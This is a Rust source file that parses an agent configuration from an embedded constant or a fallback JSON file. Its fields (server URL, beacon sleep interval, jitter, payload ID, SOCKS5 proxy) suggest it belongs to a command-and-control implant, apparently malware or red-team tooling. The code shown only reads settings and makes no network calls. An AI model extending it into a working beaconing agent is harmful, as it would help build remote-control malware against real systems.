use serde::{Deserialize, Serialize};
use std::fs;
use std::io;
use std::path::Path;
use std::env;

// Include the generated config file
include!(concat!(env!("OUT_DIR"), "/config.rs"));

#[derive(Serialize, Deserialize, Clone)]
pub struct AgentConfig {
    pub server_url: String,
    pub sleep_interval: u64,
    pub jitter: u64,
    pub payload_id: String,
    pub protocol: String,
    #[serde(default)]
    pub socks5_enabled: bool,
    #[serde(default = "default_socks5_port")]
    pub socks5_port: u16,
}

fn default_socks5_port() -> u16 {
    9050
}

impl Default for AgentConfig {
    fn default() -> Self {
        Self {
            server_url: String::new(),
            sleep_interval: 5,
            jitter: 2,
            payload_id: String::new(),
            protocol: String::from("http"),
            socks5_enabled: true,
            socks5_port: 9050,
        }
    }
}

impl AgentConfig {
    pub fn load() -> io::Result<Self> {
        // First try using the embedded config
        if let Ok(config) = serde_json::from_str::<AgentConfig>(EMBEDDED_CONFIG) {
            if !config.server_url.is_empty() && !config.payload_id.is_empty() {
                return Ok(config);
            }
            println!("[WARNING] Embedded config invalid (missing server_url or payload_id)");
        } else {
            println!("[WARNING] Failed to parse embedded config");
        }
        
        // Try filesystem config as fallback
        if let Ok(exe_path) = env::current_exe() {
            let exe_dir = exe_path.parent().unwrap_or(Path::new("."));
            let config_path = exe_dir.join(".config").join("config.json");
            
            if config_path.exists() {
                if let Ok(contents) = fs::read_to_string(&config_path) {
                    if let Ok(config) = serde_json::from_str::<AgentConfig>(&contents) {
                        if !config.server_url.is_empty() && !config.payload_id.is_empty() {
                            return Ok(config);
                        }
                    }
                }
            }
        }

        // No valid config found
        Err(io::Error::new(io::ErrorKind::NotFound, "No valid configuration found"))
    }

    pub fn get_server_url(&self) -> String {
        if self.server_url.starts_with("http://") || self.server_url.starts_with("https://") {
            self.server_url.clone()
        } else {
            format!("{}://{}", self.protocol, self.server_url)
        }
    }
}
